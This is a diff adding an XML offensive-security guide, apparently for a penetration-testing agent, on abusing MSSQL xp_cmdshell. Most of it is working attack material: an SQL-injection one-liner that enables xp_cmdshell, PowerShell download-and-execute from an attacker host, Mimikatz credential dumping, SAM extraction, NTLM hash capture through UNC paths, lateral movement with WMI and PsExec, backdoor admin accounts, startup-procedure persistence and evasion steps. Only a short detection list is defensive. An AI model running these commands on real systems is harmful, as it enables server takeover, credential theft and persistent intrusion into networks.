@@ -1,0 +1,238 @@
+<vulnerability_guide>
+  <title>MSSQL xp_cmdshell AND COMMAND EXECUTION</title>
+
+  <critical>SQL Server's xp_cmdshell executes operating system commands directly from T-SQL. When enabled, it provides immediate RCE for anyone with database access. Even when disabled, sysadmins can re-enable it, making any SQL injection in a sysadmin context a critical OS-level vulnerability.</critical>
+
+  <scope>
+    - xp_cmdshell enablement and execution
+    - Alternative command execution methods
+    - File system access techniques
+    - Network operations from SQL Server
+    - Lateral movement through SQL Server
+    - Credential harvesting
+  </scope>
+
+  <methodology>
+    1. CHECKING xp_cmdshell STATUS
+       {% raw %}
+       # Check if enabled
+       SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
+       # 0 = disabled, 1 = enabled
+
+       # Check permissions
+       SELECT * FROM fn_my_permissions(NULL, 'SERVER')
+       WHERE permission_name = 'CONTROL SERVER';
+
+       # Check if sysadmin
+       SELECT IS_SRVROLEMEMBER('sysadmin');
+
+       # Check advanced options
+       SELECT value FROM sys.configurations
+       WHERE name = 'show advanced options';
+       {% endraw %}
+
+    2. ENABLING xp_cmdshell
+       {% raw %}
+       # Enable show advanced options first
+       EXEC sp_configure 'show advanced options', 1;
+       RECONFIGURE;
+
+       # Enable xp_cmdshell
+       EXEC sp_configure 'xp_cmdshell', 1;
+       RECONFIGURE;
+
+       # Verify
+       EXEC xp_cmdshell 'whoami';
+
+       # One-liner for SQLi
+       '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+       {% endraw %}
+
+    3. COMMAND EXECUTION
+       {% raw %}
+       # Basic command execution
+       EXEC xp_cmdshell 'whoami';
+       EXEC xp_cmdshell 'ipconfig /all';
+       EXEC xp_cmdshell 'net user';
+
+       # PowerShell execution
+       EXEC xp_cmdshell 'powershell -c "Get-Process"';
+       EXEC xp_cmdshell 'powershell -enc <base64_encoded_command>';
+
+       # Download and execute
+       EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/payload.ps1'')"';
+
+       # Capture output to table
+       CREATE TABLE #output (line VARCHAR(8000));
+       INSERT INTO #output EXEC xp_cmdshell 'dir C:\';
+       SELECT * FROM #output;
+       {% endraw %}
+
+    4. ALTERNATIVE COMMAND EXECUTION
+       {% raw %}
+       # OLE Automation Procedures
+       EXEC sp_configure 'Ole Automation Procedures', 1;
+       RECONFIGURE;
+
+       DECLARE @shell INT;
+       EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
+       EXEC sp_OAMethod @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';
+
+       # SQL Agent Jobs
+       USE msdb;
+       EXEC sp_add_job @job_name = 'cmd_job';
+       EXEC sp_add_jobstep @job_name = 'cmd_job',
+            @step_name = 'step1',
+            @subsystem = 'CmdExec',
+            @command = 'whoami > C:\result.txt';
+       EXEC sp_add_jobserver @job_name = 'cmd_job';
+       EXEC sp_start_job @job_name = 'cmd_job';
+
+       # CLR Assemblies (if you can create)
+       CREATE ASSEMBLY cmd_exec FROM 0x... WITH PERMISSION_SET = UNSAFE;
+       {% endraw %}
+
+    5. FILE SYSTEM ACCESS
+       {% raw %}
+       # Read files
+       SELECT BulkColumn FROM OPENROWSET(
+           BULK 'C:\Windows\system32\drivers\etc\hosts', SINGLE_CLOB
+       ) AS data;
+
+       # Write files (via xp_cmdshell)
+       EXEC xp_cmdshell 'echo malicious > C:\path\file.txt';
+
+       # Using OLE objects
+       EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
+       EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUTPUT, 'C:\test.txt';
+       EXEC sp_OAMethod @file, 'WriteLine', NULL, 'Content here';
+
+       # Directory listing
+       EXEC xp_dirtree 'C:\', 1, 1;
+       EXEC xp_subdirs 'C:\';
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <network_operations>
+      {% raw %}
+      # UNC path access for credential theft
+      EXEC xp_dirtree '\\attacker\share';  # NTLMv2 hash sent
+      EXEC xp_fileexist '\\attacker\share\file';
+
+      # Responder/Impacket capture
+      # Capture NTLM hash of service account
+      sudo responder -I eth0 -rv
+
+      # SMB relay (if signing not required)
+      # Relay captured authentication
+
+      # Port scanning
+      EXEC xp_cmdshell 'powershell Test-NetConnection -ComputerName 10.0.0.1 -Port 445';
+      {% endraw %}
+    </network_operations>
+
+    <credential_harvesting>
+      {% raw %}
+      # Service account password
+      # SQL Server service runs as domain account
+      # xp_cmdshell executes as that account
+
+      # Dump SAM (if admin)
+      EXEC xp_cmdshell 'reg save HKLM\SAM C:\sam';
+      EXEC xp_cmdshell 'reg save HKLM\SYSTEM C:\system';
+
+      # Mimikatz
+      EXEC xp_cmdshell 'powershell IEX (New-Object Net.WebClient).DownloadString(''http://attacker/Invoke-Mimikatz.ps1''); Invoke-Mimikatz -DumpCreds';
+
+      # Linked server credentials
+      SELECT * FROM sys.linked_logins;
+      {% endraw %}
+    </credential_harvesting>
+
+    <lateral_movement>
+      {% raw %}
+      # Move to other systems
+
+      # WMI execution
+      EXEC xp_cmdshell 'wmic /node:target process call create "cmd /c whoami > \\server\share\out.txt"';
+
+      # PSExec
+      EXEC xp_cmdshell 'psexec \\target -s cmd /c whoami';
+
+      # WinRM
+      EXEC xp_cmdshell 'powershell Invoke-Command -ComputerName target -ScriptBlock {whoami}';
+
+      # Linked server exploitation
+      EXEC ('xp_cmdshell ''whoami''') AT [LinkedServer];
+      {% endraw %}
+    </lateral_movement>
+
+    <persistence>
+      {% raw %}
+      # Maintain access
+
+      # Add local admin
+      EXEC xp_cmdshell 'net user backdoor P@ssw0rd /add';
+      EXEC xp_cmdshell 'net localgroup administrators backdoor /add';
+
+      # Scheduled task
+      EXEC xp_cmdshell 'schtasks /create /tn "Backdoor" /tr "powershell -enc ..." /sc hourly';
+
+      # WMI subscription
+      EXEC xp_cmdshell 'powershell -c "... Create WMI subscription ..."';
+
+      # SQL Server startup procedure
+      CREATE PROCEDURE sp_startup_backdoor
+       AS EXEC xp_cmdshell 'powershell ...';
+      EXEC sp_procoption 'sp_startup_backdoor', 'startup', 'on';
+      {% endraw %}
+    </persistence>
+
+    <defense_evasion>
+      {% raw %}
+      # Avoid detection
+
+      # Disable xp_cmdshell after use
+      EXEC sp_configure 'xp_cmdshell', 0;
+      RECONFIGURE;
+
+      # Clear command history
+      EXEC xp_cmdshell 'del C:\output.txt';
+
+      # Use encoded commands
+      EXEC xp_cmdshell 'powershell -enc <base64>';
+
+      # Alternative execution (Agent jobs)
+      # Less monitored than xp_cmdshell
+      {% endraw %}
+    </defense_evasion>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor xp_cmdshell enablement
+    - Alert on sp_configure changes
+    - Track command execution events
+    - Monitor SQL Agent job creation
+    - Check for unusual network connections from SQL
+  </detection>
+
+  <validation>
+    - Check xp_cmdshell permissions
+    - Successfully execute OS commands
+    - Demonstrate credential capture
+    - Test lateral movement paths
+    - Document service account context
+  </validation>
+
+  <pro_tips>
+    - xp_cmdshell disabled by default but sysadmin can enable
+    - Service account determines xp_cmdshell privilege level
+    - UNC paths trigger NTLM authentication - great for hash capture
+    - SQL Agent jobs are alternative execution even without xp_cmdshell
+    - OLE Automation is another path to command execution
+    - Always check linked servers for privilege escalation
+  </pro_tips>
+
+  <remember>SQL Server is often the bridge between web application and Active Directory. xp_cmdshell provides direct OS access under the SQL Server service account - often a privileged domain account. Even without xp_cmdshell, alternatives like Agent jobs and OLE automation provide command execution. Database access is often OS access.</remember>
+</vulnerability_guide>
